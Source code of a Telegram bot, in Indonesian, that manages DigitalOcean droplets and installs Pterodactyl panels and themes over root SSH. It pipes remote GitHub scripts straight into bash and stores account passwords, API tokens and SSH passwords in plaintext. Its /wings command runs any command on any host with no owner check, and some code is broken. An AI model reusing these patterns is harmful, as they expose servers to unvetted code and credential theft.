process.on('unhandledRejection', err => {
  console.error('🚨 Unhandled Rejection:', err);
});
process.on('uncaughtException', err => {
  console.error('🚨 Uncaught Exception:', err);
});
require('dotenv').config();
const fs = require('fs-extra');
const TG = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const ssh = new Client();
const axios = require('axios');
const path = require('path');
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
if (!TELEGRAM_TOKEN) process.exit(1);
const ADMIN_ID = Number((process.env.ADMIN_ID || '').trim());
const settings = require("./settings");
const plta = settings.plta;
const pltc = settings.pltc;
const qris = settings.qris;
const { execFile } = require('child_process');
const domain = settings.domain;
const TOKEN_FILE = './do_tokens.json';
const PASS_FILE = './ssh_pass.json';
const AKUN_STORE = './do_akun.json';
const BOT_PIC = 'https://files.catbox.moe/8koufl.jpg';

const THEMES = {
  nightdy:    'https://raw.githubusercontent.com/mufniDev/nightDy/main/install.sh',
  nook:       'https://raw.githubusercontent.com/Nookure/NookTheme/release/v1.11.10/install.sh',
  autothemes: 'https://raw.githubusercontent.com/Ferks-FK/Pterodactyl-AutoThemes/main/install.sh',
  fonixblue:  'https://raw.githubusercontent.com/TheFonix/Pterodactyl-Themes/master/install.sh',
  nightcore:  'https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh',
  icemc:      'https://raw.githubusercontent.com/Angelillo15/IceMinecraftTheme/master/install.sh',
  purplemc:   'https://raw.githubusercontent.com/Angelillo15/MinecraftPurpleTheme/master/install.sh',
  freestuff:  'https://raw.githubusercontent.com/Sigma-Production/PteroFreeStuffinstaller/main/resources/script.sh'
};

let TOKENS = { current: null, list: {} };
let PASSES = {};
let DO_AKUN = [];
const DO_CLIENTS = new Map();
function generateRandomPassword() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
  const length = 10;
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
async function loadStores() {
  try { TOKENS = JSON.parse(await fs.readFile(TOKEN_FILE, 'utf-8')); } catch {}
  try { PASSES = JSON.parse(await fs.readFile(PASS_FILE, 'utf-8')); } catch {}
  try { DO_AKUN = JSON.parse(await fs.readFile(AKUN_STORE, 'utf-8')); } catch {}
}
const saveTokens = () => fs.writeFile(TOKEN_FILE, JSON.stringify(TOKENS, null, 2));
const savePasses = () => fs.writeFile(PASS_FILE, JSON.stringify(PASSES, null, 2));
const saveAkun = () => fs.writeFile(AKUN_STORE, JSON.stringify(DO_AKUN, null, 2));

function DO_API(token) {
  const api = axios.create({ baseURL: 'https://api.digitalocean.com/v2', headers: { Authorization: 'Bearer ' + token } });
  return {
    account:     async () => (await api.get('/account')).data.account,
    listDroplets:async () => (await api.get('/droplets')).data.droplets,
    getDroplet:  async (id) => (await api.get(`/droplets/${id}`)).data.droplet,
    createDroplet:async (body) => (await api.post('/droplets', body)).data.droplet,
    deleteDroplet:async (id) => (await api.delete(`/droplets/${id}`)).data,
    rebootDroplet:async (id) => (await api.post(`/droplets/${id}/actions`, { type: 'reboot' })).data.action,
    powerOffDroplet:async (id) => (await api.post(`/droplets/${id}/actions`, { type: 'power_off' })).data.action,
    powerOnDroplet:async (id) => (await api.post(`/droplets/${id}/actions`, { type: 'power_on' })).data.action,
    renameDroplet:async (id, name) => (await api.post(`/droplets/${id}/actions`, { type: 'rename', name })).data.action,
    snapshotDroplet:async (id, name) => (await api.post(`/droplets/${id}/actions`, { type: 'snapshot', name })).data.action,
    resizeDroplet:async (id, size) => (await api.post(`/droplets/${id}/actions`, { type: 'resize', size })).data.action,
  }
}
function getDO(alias = TOKENS.current) {
  if (!alias || !TOKENS.list[alias]) throw new Error('🚫 Belum ada token aktif — /addtoken');
  if (!DO_CLIENTS.has(alias)) DO_CLIENTS.set(alias, DO_API(TOKENS.list[alias]));
  return DO_CLIENTS.get(alias);
}
function listAliases() { return Object.keys(TOKENS.list); }

async function sshExec(id, commands) {
  const droplet = await getDO().getDroplet(id);
  const ip = droplet.networks.v4.find(v => v.type === 'public')?.ip_address;
  if (!ip) throw new Error('IP publik tidak ditemukan');
  const pass = PASSES[id];
  if (!pass) throw new Error('🔑 Password belum di-set — /setpass (id) (password)');
  return new Promise((res, rej) => {
    const ssh = new SSH();
    ssh.on('ready', () => {
      ssh.exec(commands.join(' && '), { pty: true }, (err, stream) => {
        if (err) return rej(err);
        let out = '';
        stream.on('data', d => out += d.toString());
        stream.on('close', code => { ssh.end(); code ? rej(new Error(out)) : res(out); });
      });
    }).on('error', rej).connect({ host: ip, username: 'root', password: pass });
  });
}

async function markAkunDigunakan(alias) {
  const idx = DO_AKUN.findIndex(a => a.alias === alias);
  if (idx !== -1) { DO_AKUN[idx].digunakan = true; await saveAkun(); }
}

(async () => {
  await loadStores();
  const bot = new TG(TELEGRAM_TOKEN, { polling: true });
  const sendBanner = (msg, caption, opts={}) =>
    bot.sendPhoto(msg.chat.id, BOT_PIC, { caption, parse_mode: 'HTML', ...opts });
const AUTO_DEL_INTERVAL = 60 * 60 * 1000;
const DAY_MS = 24 * 60 * 60 * 1000;

async function autoDeleteOldDroplets() {
  try {
    for (const alias of listAliases()) {
      const doClient = getDO(alias);
      let droplets = [];
      try {
        droplets = await doClient.listDroplets();
      } catch (e) {
        await bot.sendMessage(ADMIN_ID, `❌ Gagal ambil list VPS akun <b>${alias}</b>:\n${e.message}`, { parse_mode: 'HTML' });
        continue;
      }
      for (const vps of droplets) {
        if (!vps.created_at) continue;
        const created = new Date(vps.created_at).getTime();
        const now = Date.now();
        const umurHari = Math.floor((now - created) / DAY_MS);
        if (umurHari >= 25) {
          try {
            await doClient.deleteDroplet(vps.id);
            const ip = (vps.networks.v4.find(x => x.type === 'public') || {}).ip_address || '-';
            await bot.sendMessage(
              ADMIN_ID,
              `🗑️ <b>VPS OTOMATIS DIHAPUS</b>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `• ID: <code>${vps.id}</code>\n` +
              `• Hostname: <code>${vps.name}</code>\n` +
              `• IP: <code>${ip}</code>\n` +
              `• RAM: <code>${vps.memory || '-'}</code> MB\n` +
              `• CPU: <code>${vps.vcpus || '-'}</code>\n` +
              `• Disk: <code>${vps.disk || '-'}</code> GB\n` +
              `• Region: <code>${vps.region.slug || '-'}</code>\n` +
              `• OS: <code>${vps.image?.slug || '-'}</code>\n` +
              `• Dibuat: <code>${vps.created_at}</code>\n` +
              `• Status: <code>${vps.status || '-'}</code>\n` +
              `• Akun: <code>${alias}</code>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `Alasan: <b>Auto Delete (Expired 25 hari)</b>`,
              { parse_mode: 'HTML', disable_web_page_preview: true }
            );
            console.log(`[AUTO DEL] VPS ${vps.id} (${vps.name}) dihapus (age ${umurHari} hari)`);
          } catch (err) {
            await bot.sendMessage(
              ADMIN_ID,
              `❌ Gagal hapus VPS <b>${vps.id}</b> (${vps.name}):\n${err.message}`,
              { parse_mode: 'HTML' }
            );
          }
        }
      }
    }
  } catch (e) {
    await bot.sendMessage(ADMIN_ID, `❌ ERROR di auto-delete VPS: ${e.message}`);
  }
}

setInterval(autoDeleteOldDroplets, AUTO_DEL_INTERVAL);
  bot.onText(/^\/start$/i, msg => {
  sendBanner(
    msg,
    `<b>🚀 OTAX VPS BOT</b> <i>by <a href="https://t.me/otapengenkawin">OTAX TEAM</a></i>
━━━━━━━━━━━━━━━━━━
🛡️ <b>Token Aktif:</b> <code>${TOKENS.current || '-'}</code>
🔐 <b>Total Akun Tersimpan:</b> <code>${listAliases().length}</code>

<b>📊 VPS Monitor & Riwayat:</b>
➤ <b>/vpsadd</b> <i>&lt;alias&gt; &lt;ip:password&gt;</i> — Simpan VPS (root, DigitalOcean)
➤ <b>/vpslist</b> — Lihat semua VPS yang tersimpan
➤ <b>/vpscheck</b> <i>&lt;alias&gt; [jam]</i> — Cek status, error, & riwayat (default 24 jam)
➤ <b>/vpsdel</b> <i>&lt;alias&gt;</i> — Hapus VPS dari daftar
➤ <b>Auto Monitor:</b> Bot memeriksa semua VPS setiap jam dan kirim alert jika ada error ⚠️

<b>❓ Bantuan:</b>
➤ <b>/help</b> — Panduan singkat & contoh lengkap penggunaan
━━━━━━━━━━━━━━━━━━━`
  );
});

const helpMenu = `<b>🆘 Menu Bantuan OTAX VPS Bot</b>
───────────────
Pilih kategori bantuan di bawah ini untuk melihat tutorial penggunaan setiap fitur utama bot ini.`;

const HELP_CATEGORIES = {
    akun: { text: `<b>🟢 Panduan Akun DigitalOcean</b>
───────────────
• <b>/addakun</b> <i>gmail password alias</i>
   Simpan akun DO (email & password) ke bot
• <b>/akun</b> — List akun DO tersimpan
• <b>/sisaakun</b> — Akun DO yang belum pernah dipakai
───────────────
<b>Cara:</b>
Tambahkan akun dengan /addakun, lalu cek list akun dengan /akun.` },
    token: { text: `<b>🔑 Panduan Token DigitalOcean</b>
───────────────
• <b>/link</b> — Login DigitalOcean untuk generate token
• <b>/addtoken</b> <i>alias token</i> — Tambah API token ke bot
• <b>/usetoken</b> <i>alias</i> — Pilih token aktif
• <b>/tokens</b> — List semua token
• <b>/rmtoken</b> <i>alias</i> — Hapus token dari bot

<b>Cara Membuat Token:</b>
1. Login DO (lihat /akun)
2. Menu <b>API</b> → <b>Generate Token</b> (read+write)
3. Tambah ke bot: <code>/addtoken alias token</code>` },
    vps: { text: `<b>💻 Panduan VPS/Droplet</b>
───────────────
• <b>/createvps</b> — Wizard VPS dengan button
• <b>/list</b> — List VPS aktif
• <b>/detail</b> <i>id</i> — Detail VPS (status, IP)
• <b>/setpass</b> <i>id password</i> — Simpan password SSH
• <b>/reboot/poweroff/poweron</b> <i>id</i> — Control VPS
• <b>/delete</b> <i>id</i> — Hapus VPS
• <b>/rename</b> <i>id namaBaru</i> — Rename VPS
• <b>/snapshot</b> <i>id [name]</i> — Snapshot instan
• <b>/resize</b> <i>id size</i> — Resize VPS (harus off)
• <b>/sisa</b> — Cek limit slot VPS akun DO

<b>TIPS:</b> Setelah create VPS, lakukan <b>/setpass id pass</b> sebelum install panel/theme!` },
    install: { text: `<b>🎨 Panduan Install Panel & Theme</b>
───────────────
• <b>/installpanel</b> <i>id</i> — Install Pterodactyl Panel
• <b>/installtheme</b> <i>id slug</i> — Install theme panel (slug: /themes)
• <b>/themes</b> — List slug/theme siap install

<b>Contoh:</b>
<code>/installpanel 123456</code>
<code>/installtheme 123456 nightdy</code>

<b>Tips:</b> Pastikan password VPS sudah di /setpass sebelum install.` },
    info: { text: `<b>ℹ️ Utility & Info</b>
───────────────
• <b>/regions</b> — Lokasi server DigitalOcean
• <b>/sizes</b> — Daftar size VPS
• <b>/images</b> — List OS (Ubuntu, Centos, dll)

Owner support: <a href="https://t.me/otapengenkawin">@Otapengenkawin</a>
Bot ini cocok untuk reseller vps, panel SMM, hosting, cloud bisnis!
───────────────
<b>TIPS:</b>
- Gunakan token aktif yang benar.
- Setiap menu ada contoh/tips penggunaannya.` }
};

function helpInlineKeyboard() {
    return {
        inline_keyboard: [
            [
                { text: '🟢 Akun DO', callback_data: 'help_akun' },
                { text: '🔑 Token DO', callback_data: 'help_token' }
            ],
            [
                { text: '💻 VPS/Droplet', callback_data: 'help_vps' },
                { text: '🎨 Install Panel/Theme', callback_data: 'help_install' }
            ],
            [
                { text: 'ℹ️ Utility & Info', callback_data: 'help_info' }
            ]
        ]
    }
}

bot.onText(/^\/help$/i, msg => {
    bot.sendPhoto(msg.chat.id, BOT_PIC, {
        caption: helpMenu,
        parse_mode: 'HTML',
        reply_markup: helpInlineKeyboard()
    });
});

bot.on('callback_query', q => {
    if (!q.data?.startsWith('help_')) return;
    if (q.data === 'help_main') {
        bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});
        bot.sendPhoto(q.message.chat.id, BOT_PIC, {
            caption: helpMenu,
            parse_mode: 'HTML',
            reply_markup: helpInlineKeyboard()
        });
        return;
    }
    const key = q.data.replace('help_', '');
    if (!HELP_CATEGORIES[key]) return;
    bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});
    bot.sendPhoto(q.message.chat.id, BOT_PIC, {
        caption: HELP_CATEGORIES[key].text + '\n\n⬅️ <b>Kembali</b> ke menu bantuan',
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [ { text: '⬅️ Kembali', callback_data: 'help_main' } ]
            ]
        }
    });
});
  bot.on('polling_error', err => {});
  bot.onText(/^\/addtoken\s+(\S+)\s+(\S+)/, async (msg, [, alias, token]) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
      if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  TOKENS.list[alias] = token;
  TOKENS.current ||= alias;
  await saveTokens();
  await markAkunDigunakan(alias);
  sendBanner(msg, `✅ <b>Token <code>${alias}</code> berhasil disimpan!</b>\n\nSekarang kamu bisa create VPS, cek quota, dan install panel/theme di akun ini.\n\n<b>Tutorial:</b>\n1. /createvps <i>name</i>\n2. /list — cek VPS\n3. /installpanel <i>id</i> — install Pterodactyl\n4. /installtheme <i>id slug</i> — pasang theme\n\nLihat /help untuk fitur lainnya.`);
});

bot.onText(/^\/themes$/, msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
      if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const txt = Object.entries(THEMES).map(([k, v]) => `• <b>${k}</b>\n<code>${v}</code>`).join('\n\n');
  bot.sendMessage(msg.chat.id, `🎨 <b>Theme Siap Pakai:</b>\n\n${txt}\n\n<b>Tutorial:</b>\n1. Pastikan /setpass sudah diisi\n2. /installtheme (id_vps) (slug)\nContoh: <code>/installtheme 123456 nightdy</code>\n\nCek VPS: /list`, { parse_mode: 'HTML' });
});


bot.onText(/\/installpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const t = match[1].split(',').map(x => x.trim());

  const userId = msg.from.id;
      if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

  if (t.length < 5) {
    return bot.sendMessage(chatId, '❌ *Format Salah!*\n\n_Penggunaan:_\n`/installpanel ip_vps,password_vps,domain_panel,domain_node,ram_vps`\n*Contoh:* `/installpanel 1.2.3.4,PasswordVps,sub.domain.com,node.domain.com,16000000`', { parse_mode: "Markdown" });
  }

  const [ipvps, passwd, subdomain, domainnode, ramvps] = t;

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const password = generateRandomPassword ? generateRandomPassword() : 'otax';
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  bot.sendMessage(chatId, `🚀 *Memulai pemasangan Panel!*\n\n🖥️ *IP VPS:* \`${ipvps}\`\n🌐 *Panel:* \`${subdomain}\`\n🛰️ *Node:* \`${domainnode}\`\n💾 *RAM:* \`${ramvps}\`\n\n⏳ Mohon tunggu, proses otomatis 5-15 menit...`, { parse_mode: "Markdown" });

  conn.on('ready', () => {
    bot.sendMessage(chatId, '📦 *Step 1/3: Instalasi Panel dimulai...*', { parse_mode: "Markdown" });

    conn.exec(command, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '❌ Gagal menjalankan perintah instalasi panel!\nCek kembali IP atau password VPS.');
        conn.end();
        return;
      }
      stream.on('close', (code, signal) => {
        if (code !== 0) {
          bot.sendMessage(chatId, `❌ Proses install panel gagal (exit code ${code}).`);
          conn.end();
          return;
        }
        bot.sendMessage(chatId, '✅ *Panel selesai. Lanjut ke Step 2/3: Instalasi Wings (Node)...*', { parse_mode: "Markdown" });
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR:', data.toString());
      });
    });
  }).on('error', (err) => {
    if (err.message.includes('All configured authentication methods failed')) {
      bot.sendMessage(chatId, '❌ Koneksi SSH gagal: Password VPS salah atau akses SSH dinonaktifkan.');
    } else if (err.message.includes('connect ECONNREFUSED')) {
      bot.sendMessage(chatId, '❌ Koneksi SSH gagal: Port 22 VPS tidak terbuka atau VPS mati.');
    } else {
      bot.sendMessage(chatId, `❌ Koneksi SSH gagal: ${err.message}`);
    }
    console.error('Connection Error:', err.message);
  }).connect(connSettings);

  async function installWings(conn, domainnode, subdomain, password, ramvps) {
    bot.sendMessage(chatId, '🛠️ *Step 2/3: Instalasi Wings (Node) sedang berlangsung...*', { parse_mode: "Markdown" });

    conn.exec(commandWings, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '❌ Gagal menjalankan perintah instalasi wings.');
        conn.end();
        return;
      }
      stream.on('close', (code, signal) => {
        if (code !== 0) {
          bot.sendMessage(chatId, `❌ Proses install wings gagal (exit code ${code}).`);
          conn.end();
          return;
        }
        bot.sendMessage(chatId, '✅ *Wings selesai. Lanjut ke Step 3/3: Membuat Node & Location...*', { parse_mode: "Markdown" });
        createNode(conn, domainnode, ramvps, subdomain, password);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => {
        console.log('STDERR:', data.toString());
      });
    });
  }

  async function createNode(conn, domainnode, ramvps, subdomain, password) {
    const commandNode = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)';
    bot.sendMessage(chatId, '📡 *Step 3/3: Membuat Node & Location di panel...*', { parse_mode: "Markdown" });

    conn.exec(commandNode, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '❌ Gagal membuat node.');
        conn.end();
        return;
      }
      stream.on('close', (code, signal) => {
        if (code !== 0) {
          bot.sendMessage(chatId, `❌ Pembuatan node gagal (exit code ${code}).`);
          conn.end();
          return;
        }
        bot.sendMessage(chatId, '🎉 *Panel, Wings, dan Node sudah terpasang!*\n\n🟢 Silakan lanjut setup panel di browser.', { parse_mode: "Markdown" });
        conn.end();
        sendPanelData();
      }).on('data', (data) => {
        handleNodeCreationInput(data, stream, domainnode, ramvps);
      }).stderr.on('data', (data) => {
        console.log('STDERR:', data.toString());
      });
    });
  }

function sendPanelData() {
    bot.sendMessage(chatId,
`━━━━━━━━━━━━━━━━━━━━
<b>✅ SEMUA SELESAI</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Panel:</b> <a href="https://${subdomain}">https://${subdomain}</a>
🛰️ <b>Node :</b> <a href="https://${domainnode}">https://${domainnode}</a>
💾 <b>RAM  :</b> <b>${ramvps}</b>
👤 <b>User :</b> <b>otax</b>
🔑 <b>Pass :</b> <b>otax</b>
━━━━━━━━━━━━━━━━━━━━
<b>Cara Lanjut:</b>
1️⃣ Login panel ➜ buat location & node.
2️⃣ Node: FQDN <b>https://${domainnode}</b> | RAM <b>${ramvps}</b>
3️⃣ Buat allocation: port 2000-2300.
4️⃣ Ambil token node, lalu: /wings ip_vps,password_vps,token
5️⃣ Untuk tambah egg: import file .json dari bot.
━━━━━━━━━━━━━━━━━━━━
Note: Tunggu 1-5 menit sampai panel bisa diakses.
`, { parse_mode: 'HTML' });
}

    // Langsung kirim file egg jika ada
    const localEgg = path.resolve('./egg-botwhatsapp.json');
    if (fs.existsSync(localEgg)) {
      bot.sendDocument(chatId, localEgg, {}, { filename: 'egg-botwhatsapp.json' })
        .then(() => {
          bot.sendMessage(chatId, `🥚 <b>Egg WhatsApp sudah dikirim!</b>\n\nCara import ke panel:\n1️⃣ Login panel ➜ menu <b>Nests ➜ Import Egg</b>\n2️⃣ Upload file egg yang tadi dikirim\n3️⃣ Nest/egg akan muncul otomatis!`, { parse_mode: 'HTML' });
        });
    } else {
      bot.sendMessage(chatId, '❗ File egg-botwhatsapp.json tidak ditemukan di folder bot. Silakan upload dulu ke folder utama bot!');
    }

  // Logic auto answer/step pada panel, wings, node creation
  function handlePanelInstallationInput(data, stream, subdomain, password) {
    const str = data.toString();

    if (str.includes('(Y)es/(N)o:')) stream.write('yes\n');
    if (str.includes('Please read the Terms of Service')) stream.write('A\n');
    if (str.includes('I agree that this HTTPS request is performed')) stream.write('y\n');
    if (str.toLowerCase().includes('enter email address for let\'s encrypt')) stream.write('otax@gmail.com\n'); // ← Perbaikan!
    if (str.includes('Input')) stream.write('0\n');
    if (str.includes('Input')) stream.write(`${password}\n`);
    if (str.includes('Input')) stream.write(`${password}\n`);
    if (str.includes('Input')) stream.write(`${password}\n`);
    if (str.includes('Input')) stream.write('Asia/Jakarta\n');
    if (str.includes('Input')) stream.write('otax@gmail.com\n');
    if (str.includes('Input')) stream.write('otax@gmail.com\n');
    if (str.includes('Input')) stream.write('otax\n');
    if (str.includes('Input')) stream.write('otax\n');
    if (str.includes('Input')) stream.write('otax\n');
    if (str.includes('Input')) stream.write('otax\n');
    if (str.includes('Input')) stream.write(`${subdomain}\n`);
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('yes\n');
    if (str.includes('Input')) stream.write('\n');
    if (str.includes('Input')) stream.write('1\n');
    console.log('STDOUT: ' + str);
}
function handleWingsInstallationInput(data, stream, domainnode, subdomain, password) {
    const str = data.toString();
    if (str.includes('(Y)es/(N)o:')) stream.write('yes\n');
    if (str.includes('Input')) stream.write('1\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write(`${subdomain}\n`);
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write(`${password}\n`);
    if (str.includes('Input')) stream.write(`${password}\n`);
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write(`${domainnode}\n`);
    if (str.includes('Input')) stream.write('y\n');
    if (str.includes('Input')) stream.write('otax@gmail.com\n');
    if (str.includes('Input')) stream.write('y\n');
    console.log('STDOUT: ' + str);
}

function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    stream.write('4\n');
    stream.write('Otax\n');
    stream.write('Otax\n');
    stream.write(`${domainnode}\n`);
    stream.write('Otax\n');
    stream.write(`${ramvps}\n`);
    stream.write(`${ramvps}\n`);
    stream.write('1\n');
    console.log('STDOUT: ' + data);
}
});

bot.onText(/^\/wings\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const raw = match[1].trim();
    const c1 = raw.indexOf(',');
    const c2 = raw.indexOf(',', c1 + 1);
    if (c1 < 0 || c2 < 0) {
      return bot.sendMessage(chatId, '❌ Format: `/wings ip_vps,pass_vps,fullcommand`', { parse_mode: 'Markdown' });
    }

    const ip = raw.slice(0, c1).trim();
    const vpsPass = raw.slice(c1 + 1, c2).trim();
    const fullCmd = raw.slice(c2 + 1).trim();

    const conn = new Client();
    const DONE = '__OTAX_DONE__';

    const execCmd = (cmd) => new Promise((resolve, reject) => {
      conn.exec(cmd, { pty: true }, (err, s) => {
        if (err) return reject(err);
        let out = '', errOut = '';
        s.on('data', d => out += d.toString());
        s.stderr.on('data', d => errOut += d.toString());
        s.on('close', () => resolve({ out, errOut }));
      });
    });

    conn.on('ready', () => {
      conn.shell({ pty: true }, (err, stream) => {
        if (err) return bot.sendMessage(chatId, `❌ Shell error: ${err.message}`);
        let sudoSent = false;

        stream.on('data', async d => {
          const str = d.toString();
          if ((/\[sudo\].*password/i.test(str) || /password.*sudo/i.test(str)) && !sudoSent) {
            stream.write(`${vpsPass}\n`);
            sudoSent = true;
          }
          if (str.includes(DONE)) {
            stream.write('exit\n');
          }
        });

        stream.stderr?.on('data', d => {
          const s = d.toString();
          if ((/\[sudo\].*password/i.test(s) || /password.*sudo/i.test(s)) && !sudoSent) {
            stream.write(`${vpsPass}\n`);
            sudoSent = true;
          }
        });

        stream.on('close', async () => {
          try {
            await execCmd(`echo '${vpsPass}' | sudo -S systemctl restart wings`);
            const active = await execCmd(`echo '${vpsPass}' | sudo -S systemctl is-active wings || true`);
            const status = (active.out || active.errOut).trim();
            const detail = await execCmd(`echo '${vpsPass}' | sudo -S systemctl status --no-pager --full -n 40 wings || true`);
            const clip = (detail.out || detail.errOut).trim();
            await bot.sendMessage(
              chatId,
              `${status === 'active' ? '✅' : '❌'} Wings \`${status}\` di \`${ip}\`\n\`\`\`\n${clip}\n\`\`\``,
              { parse_mode: 'Markdown' }
            );
          } catch (e) {
            await bot.sendMessage(chatId, `❌ ${e.message || e}`);
          } finally {
            conn.end();
          }
        });

        stream.write(`${fullCmd} ; echo ${DONE}\n`);
      });
    });

    conn.on('error', e => bot.sendMessage(chatId, `❌ SSH: ${e.message || e}`));
    conn.connect({ host: ip, port: 22, username: 'root', password: vpsPass, tryKeyboard: true, readyTimeout: 30000 });
  } catch (e) {
    bot.sendMessage(chatId, `❌ ${e.message || e}`);
  }
});
bot.onText(/^\/port\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

  const [ip, passwd, port] = match[1].split(',').map(x => x.trim());
  if (!ip || !passwd || !port) {
    return bot.sendMessage(chatId, '❌ Format: /port ip,pass,port');
  }

  const conn = new Client();
  conn.on('ready', () => {
    conn.shell((err, stream) => {
      if (err) {
        bot.sendMessage(chatId, 'SSH error: ' + err.message);
        conn.end();
        return;
      }
      let out = '';
      stream.write(`ufw allow ${port}/tcp\n`);
      stream.write('exit\n');
      stream.on('close', () => {
        bot.sendMessage(chatId, `✅ Port <b>${port}</b> telah dibuka di <b>${ip}</b>\n<code>${out}</code>`, { parse_mode: 'HTML' });
        conn.end();
      })
      .on('data', d => { out += d.toString(); })
      .stderr.on('data', d => { out += d.toString(); });
    });
  }).on('error', err => {
    bot.sendMessage(chatId, 'SSH error: ' + err.message);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: passwd
  });
});

bot.onText(/^(\.|\#|\/)elysium$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /elysium ipvps,password`);
});


bot.onText(/\/elysium (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];
    if (!isOwner(msg.from.id)) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

    let t = text.split(',');
    if (t.length < 2) {
        return bot.sendMessage(chatId, `Format salah!\nPenggunaan: /elysium ipvps,password`);
    }

    let ipvps = t[0].trim();
    let passwd = t[1].trim();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/folderr/refs/heads/main/installp.sh)';
    const conn = new Client();

    conn.on('ready', () => {
        bot.sendMessage(chatId, 'PROSES INSTALL THEME DIMULAI MOHON TUNGGU 1-2 MENIT KEDEPAN');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                bot.sendMessage(chatId, '`SUKSES INSTALL THEME ELYSIUM`');
                conn.end();
            }).on('data', (data) => {
                stream.write('1\n');
                stream.write('y\n');
                stream.write('yes\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});

bot.onText(/^(\.|\#|\/)stellar$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /stellar ipvps,password`);
});

bot.onText(/\/stellar (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];
if (msg.from.id !== ADMIN_ID)
    return bot.sendMessage(chatId, '❌ Owner only.');

    let t = text.split(',');
    if (t.length < 2) {
        return bot.sendMessage(chatId, `Format salah!\nPenggunaan: /stellar ipvps,password`);
    }

    let ipvps = t[0];
    let passwd = t[1];

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)';
    const conn = new Client();

    conn.on('ready', () => {
        bot.sendMessage(chatId, 'PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                bot.sendMessage(chatId, '`SUKSES INSTALL THEME PANEL STELLAR, SILAHKAN CEK WEB PANEL ANDA`');
                conn.end();
            }).on('data', (data) => {
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});
bot.onText(/\/installdepend (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];
if (msg.from.id !== ADMIN_ID)
    return bot.sendMessage(chatId, '❌ Owner only.');
    let t = text.split(',');
    if (t.length < 2) {
        return bot.sendMessage(chatId, `Format salah!\nPenggunaan: /installdepend ipvps,password`);
    }

    let ipvps = t[0];
    let passwd = t[1];
    

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

